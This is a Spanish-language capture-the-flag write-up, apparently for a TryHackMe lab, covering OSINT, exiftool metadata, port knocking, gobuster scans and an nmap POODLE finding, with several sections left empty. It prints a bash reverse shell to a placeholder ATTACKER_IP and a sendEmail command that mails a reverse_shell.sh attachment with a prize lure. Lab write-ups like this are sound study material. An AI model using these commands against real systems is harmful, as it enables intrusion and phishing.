
### Shakers Write-Up ###
---

### Task 1

### 1.1. "Si los puertos están cerrados y las puertas bloqueadas, ¿qué haría alguien como Kevin Mitnick, quien sabía que el verdadero acceso está donde nadie mira? ¿Y si el silencio de un host fuera solo una máscara... sabrías cómo hacer que hable?"

**"Si los puertos están cerrados y las puertas bloqueadas"**

Esto indica que el sistema está protegido con medidas tradicionales:

  * Cortafuegos que cierran puertos.

  * No hay servicios visibles.

  * Se ha aplicado una política de "superficie de ataque mínima".

**¿Qué haría alguien como Kevin Mitnick?"**
Mitnick fue famoso por:

  *El ingeniería social, evasión de medidas de seguridad y técnicas poco ortodoxas.

  * Encontrar caminos que los defensores no habían considerado.

  * Usar métodos indirectos o pasivos para obtener acceso o información.

  * Esto sugiere que el atacante no atacará de frente, sino que buscará caminos menos evidentes.

**"El verdadero acceso está donde nadie mira"**

Este es el corazón de la frase.

Puede referirse a métodos que no se detectan fácilmente.

Aquí hablamos de análisis pasivo, escaneo desde otros hosts, análisis de tráfico, suplantación de identidad, etc.

También puede aludir a hosts intermedios, sistemas mal monitoreados, redes internas, etc.

**"¿Y si el silencio de un host fuera solo una máscara...?"**

Muchos hosts protegidos están configurados para no responder a paquetes sospechosos o desconocidos.

Esto podría hacer que parezcan apagados o inactivos cuando en realidad están activos.

**Conclusión:**
La frase es una forma creativa de describir cómo un atacante avanzado como Kevin Mitnick no depende de los métodos comunes (escaneos agresivos, 
puertos abiertos) sino que aprovecha el comportamiento del sistema, incluso cuando "parece" cerrado.

La técnica implícita puede ser:

✅ Escaneo encubierto como el Idle Scan
✅ Fingerprinting pasivo
✅ Timing-based reconnaissance
✅ Evasión mediante caminos no obvios (como hosts intermedios o técnicas de ingeniería social técnica)

**✅ RESPUESTA:**  

```bash
filtered
```
---------------------------------------------------------------------------------------------------------------------------------------------
### Task 2

### 2.1. ¿Qué comando de búsqueda en Google me permite encontrar más rápidos sitios web específicos relacionados con la empresa The Server Sharkers?

**Objetivo del comando:**

Queremos que Google nos devuelva resultados de una empresa específica (The Server Sharkers) o un usuario (como theserversharker) dentro de un sitio web concreto, en este caso, LinkedIn.

**Operador site:**

Este operador limita los resultados de Google a un sitio web específico.
Ejemplo:
site:linkedin.com
Esto le dice a Google: "devuélveme solo resultados dentro de linkedin.com".

Palabra clave o nombre del usuario/empresa
Si sabemos que el perfil o empresa se llama theserversharker o "The Server Sharkers", lo agregamos como término de búsqueda.
Ejemplo:
theserversharker


Combinación de ambos
Al combinar ambos:
site:linkedin.com theserversharker

Esto le dice a Google: "devuélveme resultados de LinkedIn que contengan la palabra 'theserversharker'".

**✅ RESPUESTA:**  

```bash
site:linkedin.com theserversharker/
```

---------------------------------------------------------------------------------------------------------------------------------------------
### 2.2. ¿Qué podemos extraer de la sección de Destacado de la empresa The Server Sharkers? ###

En la página oficial de Server Shakers, se encuentra una sección denominada 'Destacados', que incluye una imagen representativa de una página. 

Si el atacante encontro la pagina correcta, deberia ver esto:

<img width="822" alt="Captura de pantalla 2025-04-27 a las 14 43 17" src="https://github.com/user-attachments/assets/7488fec0-62bf-4e54-ab05-fdbaadcc1370" />

A través de esta imagen, el atacante puede acceder a información adicional y relevante, lo que facilita la obtención de datos complementarios.

Al hacer click, encontramos la siguiente publicación del perfil de The Server Shakers, la cuál contiene una URL.

<img width="1128" alt="Captura de pantalla 2025-04-27 a las 15 04 25" src="https://github.com/user-attachments/assets/8181f735-bbca-42d6-b111-b93e95872bae" />

**✅ RESPUESTA:**
```bash
  reoobot.github.io/TheServerSharkers/carrera
```

---------------------------------------------------------------------------------------------------------------------------------------------
### 2.3. ¿Qué podemos extraer de la sección de Destacado de la empresa The Server Sharkers? ###

El navegador o herramienta como curl realiza una solicitud GET a la URL especificada.
En este caso, la URL es:
https://reoobot.github.io/TheServerSharkers/

Al usar -v, curl muestra en pantalla:

  * Los encabezados enviados (por ejemplo, GET / HTTP/1.1, User-Agent, Host)

La respuesta del servidor, incluyendo:

  * Código de estado (por ejemplo, HTTP/2 200 OK)

Encabezados HTTP de respuesta como Content-Type, Content-Length, Date, entre otros.

El encabezado que nos interesa es:

  * Content-Length: XXXX

Este valor representa el tamaño en bytes del cuerpo del contenido HTML que el servidor está enviando. 
Es crucial en ciertos tipos de ataques o análisis porque te permite:
  * Saber cuánto contenido tiene la página sin descargarla completamente.

Comparar si distintos parámetros cambian el tamaño de la respuesta.

Detectar posibles vulnerabilidades (por ejemplo, cuando el contenido cambia dependiendo del usuario o del error generado). Este dato puede usarse, por ejemplo, en ataques de enumeración o detección de rutas ocultas:

  * Si cambias la URL o parámetros, y el Content-Length varía, puedes detectar qué recursos existen o no.

**✅ RESPUESTA:**
```bash
  curl -v https://reoobot.github.io/TheServerSharkers/
```

-------------
### 2.4. ¿En qué página personal o red profesional podríamos encontrar más información detallada sobre "TheServerSharkers" o sus miembros? ###

**Identificación del archivo objetivo**
Durante la recolección de información sobre el sitio web relacionado con la empresa ficticia The Server Sharkers, encontré una imagen accesible desde la URL pública del repositorio:

https://reoobot.github.io/TheServerSharkers/manolo1.webp

**Descarga del archivo**

Usé curl para descargar la imagen localmente:

```bash
curl -o manolo1.webp https://reoobot.github.io/TheServerSharkers/manolo1.webp
```

**Análisis con exiftool**

Apliqué la herramienta exiftool sobre la imagen descargada para extraer los metadatos:

```bash
exiftool manolo1.webp
```

**Detección de información reveladora**

Entre los metadatos, encontré un campo llamado Author que contenía un comando completo:

sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a

**Interpretación del contenido**

Analizando el comando, pude extraer múltiples indicadores relevantes:

  * El remitente usaba una dirección con dominio @kali.com, lo cual sugiere que el atacante emplea Kali Linux, un sistema operativo comúnmente usado para hacking ético.

  * El asunto "ReverseShell" implica la intención de ejecutar una shell inversa, una técnica habitual para obtener acceso remoto.

  * El mensaje contiene una provocación en tono de reto, típico en entornos de Capture The Flag (CTF) o pruebas de seguridad ofensiva.

  * El destinatario sharkers@localhost y el servidor SMTP "IP-Victima" apuntan a una simulación o infraestructura interna.

  * El uso de -o tls=no indica que se está usando un servidor de correo sin cifrado, lo cual es una mala práctica o parte de un entorno controlado.

  * A partir de una imagen aparentemente inocua, logré, mediante una herramienta OSINT (exiftool), extraer metadatos que revelaban:

  * El sistema operativo del atacante

  * El tipo de ataque planeado

  * Información de infraestructura

  * Y prácticas potencialmente vulnerables

Esto demuestra cómo el análisis de metadatos puede proporcionar inteligencia valiosa en una fase de reconocimiento.

**✅ RESPUESTA:**
```bash
  sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a
```

-------------
### 2.5. Los metadatos guardan secretos que no se van a simple vista. Encuentra la imagen del traidor, la que guarda su huella invisible, como Author ###



-------------

### 2.6. "Has obtenido acceso limitado a una máquina víctima. ¿Cómo podrías devolver una shell interactiva a tu máquina, sabiendo que Bash está disponible y puedes ejecutar comandos arbitrarios?" ###

**¿Cómo se llega a esta conclusión?**
Entorno con Bash disponible
La premisa menciona que la víctima tiene Bash instalado. Esto es fundamental, ya que Bash permite redirigir flujos de entrada/salida y tiene acceso a dispositivos especiales como /dev/tcp.

**Capacidad de ejecutar comandos arbitrarios**
Esto implica que puedes escribir y ejecutar un comando directamente desde el intérprete de comandos o algún punto de entrada, como una vulnerabilidad en una aplicación web o consola mal asegurada.

**Necesidad de una reverse shell**
En muchos escenarios, cuando estás dentro de una máquina víctima con acceso limitado, no puedes iniciar una sesión SSH o abrir puertos. Por tanto, se requiere que la máquina víctima inicie la conexión hacia tu equipo atacante, que debe estar esperando.

**Investigas o recuerdas que Bash permite conexiones de red**
Bash tiene una característica poco conocida pero muy poderosa: los dispositivos virtuales /dev/tcp/host/port.

Este mecanismo te permite crear conexiones TCP directamente desde Bash sin necesidad de herramientas externas como nc, python, perl, etc.

**Sabes que Bash también puede lanzar una shell interactiva (bash -i)**
El flag -i inicia Bash en modo interactivo, útil para mantener una sesión viva y activa.

**Combinas todo con redirecciones**
Aquí es donde se juntan las piezas:

  * bash -i: lanza una shell interactiva,

  * >&: redirige la salida estándar (1) y la salida de errores (2) hacia la entrada del socket TCP,

  * /dev/tcp/ATTACKER_IP/PORT: es el canal TCP hacia tu máquina

  * 0>&1: redirige la entrada estándar hacia ese mismo canal.

**✅ RESPUESTA:**
```bash
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

-------------

### 2.7. "Cuando alguien menciona 'Knock', ¿te preguntas si es una referencia al golpe que haces para entrar en un sistema, o acaso estás buscando algo en los rincones más oscuros de la red?" ###

**Interpretación del término “Knock”**

La palabra "Knock" en un contexto de hacking o seguridad no suele ser literal. En el ámbito técnico, suele asociarse con la técnica llamada Port Knocking.

Clave: La mención de "golpe para entrar en un sistema" → metáfora clara para Port Knocking.

**Análisis de la pista “Tres knock^3, secretos: 1234, 2345, 3456”**

Esta parte te da una estructura:

  * “Knock³” → indica 3 secuencias, y “tres” indica que hay tres golpes por secuencia.

  * “1234, 2345, 3456” → son puertos, y cada número representa un puerto TCP.

Esto coincide exactamente con cómo funciona Port Knocking:

  * Un demonio oculto en el sistema escucha secuencias de conexión a puertos cerrados.

Si la secuencia exacta es recibida (como 1234 → 2345 → 3456), el demonio puede abrir un puerto real (por ejemplo, SSH en 22) al atacante.

**“La vieja puerta filtrada crujió...”**

Esta frase sugiere que:

  * La puerta estaba cerrada o protegida,

Pero algo (como la secuencia correcta) la ha hecho ceder o abrirse,

Y lo que había detrás ahora es accesible → tal vez una shell, una bandera o una pista secreta.

**“La respuesta son 3 palabras de 4 caracteres”**

Esto indica que:

  * El recurso desbloqueado tras la secuencia contiene una clave,

  * Esta clave tiene un formato específico: xxxx xxxx xxxx (tres palabras, cada una de cuatro letras).

  * Este tipo de formato es común en retos CTF para representar flags o contraseñas.

**✅ RESPUESTA:**
```bash
 1234 2345 3456
```

-------------

### 2.8. "Había una vez un tiburón llamado Server, perdido en el vasto océano de IPs. Un sabio navegante escribió su nombre en el mapa secreto /etc/hosts, y así, cada vez que alguien llamaba a ' ', encontraba su guarida oculta entre las olas." ###

**Desglose del acertijo:**

“Había una vez un tiburón llamado Server, perdido en el vasto océano de IPs.”

**🔍 Interpretación:**

Esto representa un nombre de dominio (como theserversharkers.io) que no puede resolverse por DNS. Es decir, está “perdido” en el océano de direcciones IP porque no hay un registro DNS público que lo asocie a una IP.

**📘 “Un sabio navegante escribió su nombre en el mapa secreto /etc/hosts...”**

Esta es una referencia directa al archivo local /etc/hosts, que permite asociar manualmente un nombre de dominio con una dirección IP sin pasar por DNS.

**🧠 “...y así, cada vez que alguien llamaba a ' ', encontraba su guarida oculta entre las olas.”**

Una vez que haces esta asociación localmente, cuando intentes acceder a theserversharkers.io, tu sistema sabrá exactamente a qué IP debe conectar. Es decir, encuentra su “guarida” (la IP) bajo las olas (sin necesidad de DNS).

**🛠️ ¿Qué hacer con esta pista?**
Sabemos que:

  * Se te proporciona una IP pública por TryHackMe (por ejemplo, 10.10.123.45).

  * El nombre de dominio theserversharkers.io aparece en la pista, pero no responde en DNS, por lo tanto no es resoluble por defecto.

  * Al intentar acceder al sitio desde Kali, ves que no carga (error de DNS).

  * Sabes que en entornos CTF o pentesting, cuando un dominio no resuelve pero es necesario para el reto, la solución es editar /etc/hosts.

  * Al hacerlo, apuntas el dominio a la IP que te proporciona TryHackMe.

**Acción concreta: añadir entrada en /etc/hosts**

Abre el archivo /etc/hosts con permisos de superusuario:

```bash
 sudo nano /etc/hosts
```

Agrega la siguiente línea (ajustando la IP si es diferente):

```bash
 IP_MAQUINA theserversharkers.io
```

**¿En qué máquinas debes hacerlo?**

| Máquina              | ¿Editar `/etc/hosts`?   | ¿Por qué? |
|----------------------|--------------------------|-----------|
| 🐱 Kali (cliente)     | ✅ Sí, obligatorio        | Para que puedas acceder a `http://theserversharkers.io` desde tu navegador o con herramientas como `curl` o `nmap`, ya que el dominio no existe en los DNS públicos. Kali necesita saber que `theserversharkers.io` apunta a la IP de la máquina de TryHackMe. |
| 🐳 TryHackMe (servidor) | ✅ Sí, si el servidor lo requiere | Si el servidor web, aplicación o script que corre en esa máquina verifica el nombre de dominio solicitado o hace redirecciones basadas en el nombre del host, entonces también necesita poder resolver `theserversharkers.io` localmente. |

**Maquina Virtual Kali**
<img width="1644" alt="Captura de pantalla 2025-05-02 a las 19 51 57" src="https://github.com/user-attachments/assets/dcd09743-887d-4e5f-ae51-5ec1f9a44c55" />


**Maquina Virtual THM**
<img width="1710" alt="Captura de pantalla 2025-05-02 a las 19 50 20" src="https://github.com/user-attachments/assets/a3ed7ac4-1069-49e3-9f13-ac2ecc79cb49" />

Porque en el /etc/hosts es donde se escribe el “mapa secreto” que permite al dominio sin DNS ser encontrado y accedido correctamente, esa es la respuesta.

**✅ RESPUESTA:**
```bash
 sudo nano /etc/hosts
```
-------------
### 2.9. "Como Homero buscando donas en callejones secretos de Springfield, recorrí los rincones ocultos de The Server Sharkers, golpeando cada puerta .php, .html, .txt y .mp4, esperando encontrar un dulce premio digital." ###

**🧠 Interpretación**

🔍 ¿Qué nos sugiere esta metáfora?
"Homero" → representa al usuario curioso o hacker ético que explora sin parar.

"Callejones secretos" → rutas ocultas en un sitio web.

"Golpeando cada puerta .php, .html, .txt y .mp4" → es una clara alusión a un escaneo de directorios y archivos, buscando recursos no públicos o mal protegidos.

"Esperando encontrar un dulce premio digital" → busca información confidencial o una bandera (flag) en un CTF.

🧰 2. Relación con técnicas de pentesting
Todo lo anterior describe una práctica común: el fuzzing de rutas o archivos en un servidor web.

Esto consiste en:

  * Probar muchas rutas (como /admin, /login, /backup.zip) para descubrir recursos no visibles en la página principal.

  * Hacerlo de forma automatizada usando herramientas como Gobuster, FFUF, Dirb, etc.

  * Usar un diccionario de palabras (wordlist) que simula “golpear puertas” con diferentes nombres de archivos o carpetas.

🛠️ 3. ¿Por qué Gobuster?
Es una herramienta ligera, rápida y ampliamente usada para descubrir directorios o archivos ocultos.

Soporta múltiples modos (como dir, dns, vhost), pero en este caso nos interesa dir, para buscar rutas/archivos en un sitio web.

Se integra bien con listas de palabras como la clásica common.txt de DirB, disponible en Kali Linux.

🔍 4. Construcción lógica del comando

Basado en la interpretación anterior, el comando se arma así:
```bash
  gobuster dir -u http://theserversharkers.io/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

🧾 Explicación del comando:

dir: indica que se trata de un escaneo de directorios.

-u http://theserversharkers.io/: es la URL del objetivo.

-w /usr/share/wordlists/dirb/common.txt: wordlist que contiene nombres comunes de archivos y carpetas para probar.

-t 30: define el número de hilos (threads) para acelerar la búsqueda (30 es un valor razonable sin saturar).

Sabemos que el comando funciona y que las dos maquinas tiene el servidor de theservershakers activos porque el gobuster devuelve esto:

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 12 37 39" src="https://github.com/user-attachments/assets/ae38dbb7-834d-4fd4-85c0-46f89011aca4" />


**Conclusión lógica (respuesta deducida):**
El acertijo describe de manera creativa un escaneo de rutas ocultas, y todas las pistas apuntan a la necesidad de:

  * Usar una herramienta de fuzzing de rutas
  * Buscar archivos con extensiones comunes
  * Aplicarlo sobre theserversharkers.io

Por lo tanto, la respuesta correcta y razonada es:
**✅ RESPUESTA:**
```bash
 gobuster dir -u
```

-------------
### 2.10. "Al final del puerto 80, entre el eco de las respuestas, ¿será este el momento donde un diccionario abre la puerta oculta, o acaso la clave yace en algo más profundo, más oscuro, más encriptado? La verdad se encuentra entre los bits, ¿te atreves a seguir?" ###

"La verdad se encuentra entre los bits, ¿te atreves a seguir?"

...y después te dan directamente el enlace http://theserversharkers.io, la respuesta es simplemente esa URL. No hace falta complicarlo con herramientas como curl, porque:

Ya configuraste /etc/hosts para que theserversharkers.io apunte a la IP correcta.

Ya entendiste que el puerto 80 es el principal.

Y ahora el reto es seguir navegando por esa URL en el navegador o con herramientas posteriores.

**✅ RESPUESTA:**
```bash
  http://theserversharkers.io
```
-------------
### 2.11. "En el mundo del hacking, como en las películas de los 90, ¿puede un diccionario de 98 palabras desbloquear el puerto 80, o es solo una ilusión en la red?" ###

Ahora, con todos los otros pasos hechos, tenemos que desplear la pagina de TheServrShakers.

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 12 44 50" src="https://github.com/user-attachments/assets/0c3ab85e-c2f1-4e0d-8b1b-68cc9ccbb4ba" />

Hacemos click y nos debería cargar la pagina con el siguiente mensaje. 
Las paginas y sus mensajes pueden tardar en cargas, así que dale tiempo.

<img width="1677" alt="Captura de pantalla 2025-05-02 a las 20 52 03" src="https://github.com/user-attachments/assets/f6b6a25e-3b25-4a6a-8683-63c1254d1187" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 20 55 21" src="https://github.com/user-attachments/assets/2f53d2b0-2cd4-45a5-9ac9-45bed0eb2ecd" />

Las respuestas que nos piden a continuación tien que ver con las respuestas del task 2, 
así que no puedes entrar en está area hasta que las hayas resuleto cada una de ellas.

<img width="1708" alt="Captura de pantalla 2025-05-02 a las 20 58 31" src="https://github.com/user-attachments/assets/03a0a480-3832-499b-a669-34dbd34369b3" />

<img width="1704" alt="Captura de pantalla 2025-05-02 a las 20 59 09" src="https://github.com/user-attachments/assets/3537d919-f8a4-4e07-8cfb-63fada515c31" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 21 02 28" src="https://github.com/user-attachments/assets/c8092a8a-f590-41a1-980f-2c6076e958f0" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 21 03 54" src="https://github.com/user-attachments/assets/ebc041e9-516b-4910-9038-bafd56d772b3" />

**✅ RESPUESTA:**
```bash
  sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a
```

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 21 05 47" src="https://github.com/user-attachments/assets/d2d1fd14-253a-4265-9892-2aba7f0b67f9" />

**✅ RESPUESTA:**
```bash
 sendEmail -f prueba@kali.com -t sharkers@localhost -u "EnviarAdjunto" -m "Este es tu premio no te lo pierdas, apuesta ya, PREMIO DE 1000000" -s "IP_Victima" -o tls=no -a /home/vagrant/Documents/reverse_shell.sh
```
<img width="1705" alt="Captura de pantalla 2025-05-02 a las 21 06 57" src="https://github.com/user-attachments/assets/9d1caad2-686f-4ce8-acbb-eeaf8243448e" />

La respuesta es obviamente Barcelona, pero con b minuscula.

Despues de resolver todas las preguntas, te aparece esta siguiente pagina web, y damos un click. 

<img width="1708" alt="Captura de pantalla 2025-05-02 a las 21 31 51" src="https://github.com/user-attachments/assets/99ef374a-0947-46ed-a098-702bd36d6277" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 02 36" src="https://github.com/user-attachments/assets/2c984661-52a1-4789-ac7f-47e3941fd02c" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 03 06" src="https://github.com/user-attachments/assets/07b883ce-fd72-422e-ad5b-ac9fc7812de9" />

Dejamos que se lo suficiente para que nos muestre la contraseña del archivo confidencial 
y esta es la respuesta.

Como consejo, te recomiendo esperar a que la pagina termine de cargar porque despues comienza a lanzar palabras que necesitaras guardar en un archivo para el siguiente ejercicio:

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 06 31" src="https://github.com/user-attachments/assets/71710658-9a25-4171-9d99-62d66b381990" />


**✅ RESPUESTA:**
```bash
  oxfbyhjdv123
```

-------------
### 2.12. ¿qué secretos ocultos pueden desvelarse al descubrir subdominios o virtual hosts en el servidor? ¿Qué conexiones inesperadas de puertos o configuraciones de DNS podrían hallarse bajo la superficie?" ###

**🔍 Interpretación:**
Este mensaje nos habla de una capa más profunda de enumeración en entornos web: la existencia de virtual hosts o subdominios configurados en el servidor que no están visibles a simple vista. Veamos qué puede significar esto:

  * Virtual Hosts: En un mismo servidor (misma IP), pueden existir múltiples sitios web diferenciados únicamente por el nombre del dominio. Por ejemplo, admin.theserversharkers.io podría apuntar al mismo servidor que theserversharkers.io, pero mostrar contenido completamente distinto.
Estos sitios no se detectan con un simple navegador si no conoces el nombre exacto.

  * Subdominios ocultos: Podrían existir configuraciones activas que solo responden si se solicita el sitio con el subdominio correcto. Esto se usa muchas veces para ocultar paneles de administración, entornos de staging, APIs, etc.

  * DNS alternativos: Es posible que el servidor tenga respuestas diferentes dependiendo del Host que se envía en la cabecera HTTP, lo que se configura en Apache/Nginx usando ServerName o ServerAlias.

💻 Comando clave:
Si guardaste las palabras en un archivo, en este caso está en Downloads/document y aplicaste el gobuster
con los comandos correctos deberias tener algo así: 

```bash
  gobuster vhost -u http://10.10.150.87 --domain theserversharkers.io -w ~/Downloads/document.txt --append-domain
```

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 10 10" src="https://github.com/user-attachments/assets/6ba33680-5c80-48ae-a399-2d4d481478d1" />

**✅ RESPUESTA:**
```bash
  gobuster vhost -u http://10.10.150.87
```
-------------
### 2.13. ¿Cuál es el usuario de The Server Sharkers que tiene cuatro letras? ###



-------------

### TAKS 3
### 3.1. "Si lograste acceder a un sistema a través de SSH, ¿cómo sabrías qué usuario está detrás de la puerta cerrada? A veces, el whoami o un simple ps aux pueden revelar más de lo que imaginas." ###

Ahora que tenemos la pagina que 


-------------
### 3.2."Tres knock^3, secretos: 1234, 2345, 3456. La vieja puerta filtrada crujió... ¿qué misterios aguardaban tras ella? ###


-------------
TASK 4
### 4.1. Los servicios que parecen comunes pueden ser la clave para acceder a algo más profundo. Revisa los servicios en ejecución, los scripts vulnerables y la forma en que los puertos pueden estar interconectados. Si no encuentras lo obvio, ¿has considerado los servicios no expuestos o mal configurados? ###




-------------
TASK 4
### 4.2. A veces lo que parece cerrado, está solo esperando a ser descubierto. ¿Cuántos puertos realmente están abiertos, listos para ser explorados? Quizá no todos son tan evidentes... ¿Lo has comprobado? ###

Con base en la respuesta anterior, podemos deducir cuantos puertos estan abiertos usando la vulnerabilidades encontradas.

<img width="865" alt="Captura de pantalla 2025-05-02 a las 11 46 26" src="https://github.com/user-attachments/assets/f5f4e788-3d73-4675-8e4f-44b52a9c2a7e" />

<img width="865" alt="Captura de pantalla 2025-05-02 a las 11 46 26" src="https://github.com/user-attachments/assets/a206024a-bb03-471b-a86b-094a0bcc677b" />

**✅ RESPUESTA:**
```bash
 3
```
-------------
### 4.3. ¿Cuál es el nombre de la vulnerabilidad que permite a un atacante interceptar y manipular conexiones cifradas de forma antigua, aprovechando una debilidad en un protocolo de cifrado obsoleto? ###

Para encontrar esta vulnerabilidad, tenemos que consultar el informe de vulnerabilidades hecho por nmap, y ahi encontraremos la respuesta.

<img width="1624" alt="Captura de pantalla 2025-05-02 a las 11 53 04" src="https://github.com/user-attachments/assets/9e68dbce-69dc-4cf4-b2b9-84017dab4547" />

Sabemos que esta es la vulnerabilidad preguntada porque concuerda con la descripción del enunciado.

**✅ RESPUESTA:**
```bash
 POODLE
```
-------------
### 2.3. ¿En qué página personal o red profesional podríamos encontrar más información detallada sobre "TheServerSharkers" o sus miembros? ###

Esta pregunta está relacionada con la anterior, ya que, sin utilizar el comando site:, sería muy difícil para un atacante encontrar información relevante sobre "TheServerSharkers".

Una vez que sabemos cómo filtrar correctamente, debemos centrarnos en la pregunta, que hace referencia a una página personal. 
Al intentar usar el comando site:, los resultados se reducen considerablemente, lo que facilita mucho la localización de la información que buscamos. 
Sin embargo, aún no hemos encontrado la página exacta que necesitamos. 
Además, la pregunta también menciona una red profesional, y la red profesional más grande del mundo es LinkedIn. Con esto en mente, 
podemos aplicar el filtro para centrarnos en los resultados de LinkedIn, donde es más probable encontrar información detallada sobre la empresa o sus miembros.

| **Resultado** | **Imagen** |
|---------------|------------|
| **Sin `site:`** | ![Resultado sin `site:`](https://github.com/user-attachments/assets/53049892-6ae9-4def-8ede-61eaae1a8f12) |
| **Con `site:`** | <img width="1037" alt="Captura de pantalla 2025-04-27 a las 12 39 41" src="https://github.com/user-attachments/assets/0921cac7-652f-4135-aa45-2492ea7ecaf8" /> |
| **Con `site:linkedin.com theserversharker/`** | ![Resultado con `site:`](https://github.com/user-attachments/assets/f4f42b21-9eb5-4082-bd7e-c8544da4b78a) |


**✅ RESPUESTA:**
```bash
  LinkedIn
```

---------------------------------------------------------------------------------------------------------------------------------------------

### 4. ¿Qué URL puedes extraer de la pagina que encontraste? ###

En la página oficial de Server Shakers, se encuentra una sección denominada 'Destacados', que incluye una imagen representativa de una página. 

Si el atacante encontro la pagina correcta, deberia ver esto:

<img width="822" alt="Captura de pantalla 2025-04-27 a las 14 43 17" src="https://github.com/user-attachments/assets/7488fec0-62bf-4e54-ab05-fdbaadcc1370" />

A través de esta imagen, el atacante puede acceder a información adicional y relevante, lo que facilita la obtención de datos complementarios.

Al hacer click, encontramos la siguiente publicación del perfil de The Server Shakers, la cuál contiene una URL.

<img width="1128" alt="Captura de pantalla 2025-04-27 a las 15 04 25" src="https://github.com/user-attachments/assets/8181f735-bbca-42d6-b111-b93e95872bae" />

**✅ RESPUESTA:**
```bash
  reoobot.github.io/TheServerSharkers/carrera
```

---------------------------------------------------------------------------------------------------------------------------------------------

### 5. Tras realizar una investigación exhaustiva, encuentras la página oficial de la empresa objetivo. Para continuar con tu ataque, necesitas conocer el Content-Length de la página. ¿Cuál es? ###

Después de ir a la pagina a lque LinkedIn hace referencia, encontramos que tiene más informacion acerca de The Server Shakers, como el nombre de sus empleados, pero más importante
el link de su pagina web en fase de desarrollo.

<img width="1710" alt="Captura de pantalla 2025-04-27 a las 17 50 37" src="https://github.com/user-attachments/assets/f64094fb-be8f-47cd-bfb4-31c200278246" />

Una vez hacemos click, encontramos la fagina oficial de la empresa. El enunciado nos pide que busquemos el content lengthd de la paina para hacer un ataque. La manera más sencilla de hacerlo es descargar la pagina con el uso de comandos curl, eso si no esta protegida, el cual no es el caso, por lo que hacemos eso. 

El resultado es el siguiente.

| **Resultado** | **Imagen** |
|---------------|------------|
| **Sitio Web** | <img width="1710" alt="Captura de pantalla 2025-04-27 a las 17 56 08" src="https://github.com/user-attachments/assets/97a1ac42-47f4-42d9-99bd-755edd369e7d" /> |
| **Información extraida 1** | <img width="916" alt="Captura de pantalla 2025-04-27 a las 18 01 04" src="https://github.com/user-attachments/assets/29b79077-95d6-4fe7-b303-2451e0d8f1d6" />|
| **Información extraida 2** | <img width="1710" alt="Captura de pantalla 2025-04-27 a las 18 03 14" src="https://github.com/user-attachments/assets/a9c8ea27-f59a-4200-bda4-4071478c2af0" /> |

**✅ RESPUESTA:**
```bash
 2952
```

---------------------------------------------------------------------------------------------------------------------------------------------
### 6. Los metadatos guardan secretos que no se ven a simple vista. Encuentra la imagen del traidor, la que guarda su huella invisible. Descubre la fecha de modificación.

Primero que todo, tenemos que saber quien es el traidor. La persona con la que llegamos a la pagina web fue Manolo Gomez, quien publico la pagina en fase de desarrollo.
Sabiendo esto, tenemos que volver a la pagina filtrada y buscar en el codigo fuente cuál es la foto de Manolo.

<img width="1710" alt="Captura de pantalla 2025-04-27 a las 20 45 07" src="https://github.com/user-attachments/assets/7b4a7800-6104-417e-8115-41f0598b356d" />

<img width="1710" alt="Captura de pantalla 2025-04-27 a las 20 45 23" src="https://github.com/user-attachments/assets/7bf490f3-13a1-487f-af3b-e1423371d022" />

Después de encontrar las fotos, podemos descargar la foto con el comando curl, el cuál es el más útil. 

📚 ¿Para qué sirve el culr?

curl es una herramienta de línea de comandos utilizada para transferir datos desde o hacia un servidor. Su nombre proviene de "Client URL", ya que es comúnmente utilizada para realizar solicitudes de red a URLs. Es una herramienta muy poderosa y flexible que permite trabajar con distintos protocolos, como HTTP, HTTPS, FTP, entre otros.

Pero para descargar la foto, tenemos especificar la ubicación de la foto, que es un directorio dentro de la pagina. La ubicación se pondria despues de la ubicación URL.

El comando es:

curl -v https://reoobot.github.io/TheServerSharkers/manolo1.webp

Una vez descargada, el atacante analizario los comandos con exiftool.

Exiftool

Es una poderosa herramienta de línea de comandos utilizada para leer, escribir y editar metadatos en archivos de imagen, audio y vídeo. Los metadatos son datos adicionales sobre el archivo, como la información de la cámara que se usó para tomar una foto, la fecha y hora en que se tomó, la ubicación (si se ha registrado), los parámetros de exposición, entre otros.

Comando:

exiftool manolo1.webp

<img width="1710" alt="Captura de pantalla 2025-04-27 a las 21 07 42" src="https://github.com/user-attachments/assets/09a567c1-a9cb-4875-a3f9-3396e727484e" />


**✅ RESPUESTA:**
```bash
 2025/04/27
```
